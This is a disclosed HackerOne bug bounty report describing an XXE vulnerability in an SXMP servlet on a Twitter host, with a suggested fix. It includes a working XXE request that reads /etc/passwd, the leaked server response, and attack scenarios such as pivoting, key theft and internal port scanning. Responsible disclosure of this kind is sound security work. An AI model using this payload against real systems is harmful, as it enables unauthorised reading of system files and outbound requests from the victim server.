# XXE on sms-be-vip.twitter.com in SXMP Processor

## Report Details
- **Report ID**: 248668
- **URL**: https://hackerone.com/reports/248668
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-07-12T11:21:47.251Z
- **Disclosed**: 2017-07-26T23:03:43.309Z

## Reporter
- **Username**: joshbrodienz
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
Hi team,

##What type of issue are you reporting? Does it align to a CWE or OWASP issue?
I've identified an XXE vulnerability in the cloudhopper sxmp servlet on sms-be-vip.twitter.com which discloses local files to an external attacker and allows web requests to be sent. This aligns to https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing


##How does a user reproduce your issue?
To demonstrate the use of this vulnerability for arbitrary file read, I sent the following request:

    POST /api/sxmp/1.0 HTTP/1.1
    Host: sms-be-vip.twitter.com
    Connection: close
    Content-Type: text/xml
    Content-Length: 481

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [  
       <!ELEMENT foo ANY >
       <!ENTITY file SYSTEM "file:///etc/passwd"> 
    ]>
    <operation type="deliver">
    <account username="abc" password="a"/>
    <deliverRequest referenceId="MYREF102020022">
    <operatorId>&file;</operatorId>
    <sourceAddress type="network">40404</sourceAddress>
    <destinationAddress type="international">123</destinationAddress>
    <text encoding="ISO-8859-1">a</text>
    </deliverRequest>
    </operation>
    </code>

In response, the server returned its /etc/passwd file in an error message:

    <?xml version="1.0"?>
    <operation type="deliver">
      <error code="1010" message="Unable to convert [root:x:0:0:root:/root:/bin/bash...[truncated by researcher] to an integer for [operatorId]"/>
    </operation>

In addition to local file read, it was confirmed through testing that if "file:///etc/passwd" is replaced with a URL, the servlet will make external requests and that it has outbound access to the internet.

##What is the impact of your issue?
Depending on the trust relationships afforded to this host, XXE can be a viable candidate for pivoting to other related hosts It can be used to disclose sensitive files such as certificates and source from the target. This could expose some of the restricted functionality and capabilities of this host to the attacker. 

##What are some scenarios where an attacker would be able to leverage this vulnerability?
Any remote attacker can utilise this vulnerability to read from the filesystem. On finding this host (indexed by Google and identifiable through certificate transparency logs, so an attacker can discover it without excessive effort, its functionality can be explored by identifying that the code it is running maps to code found on https://github.com/twitter/cloudhopper-commons

In this instance, if this were an isolated host with no opportunity to pivot, as an attacker I would investigate whether I could use file read to bypass the credential requirement which thwarted earlier attempts to interact with this service.

If this host contains API keys or certificates for access other Twitter properties, an attacker could leverage these to escalate their compromise. The web request functionality could also be utilised to port scan any internal hosts which this server has access to.

##What would be your suggested fix?
If the servlet is not in use, remove it from the server. If it is in use, reduce the functionality of the XML parser such that entities are not resolved, outbound network traffic is disallowed and parameter expansion is disabled.

##Conclusion
I don't want to flood the report with stuff you're probably already well aware of, so let me know if you need more information and I'll leave it to y'all to determine how important this host is if attacked using this issue. Please advise if your severity rating policy requires me to demonstrate the full possible impact of the vulnerability, as I've terminated testing as early as possible to provide this advice and wait on your response.

Cheers,

Josh Brodie

## Attachments
No attachments
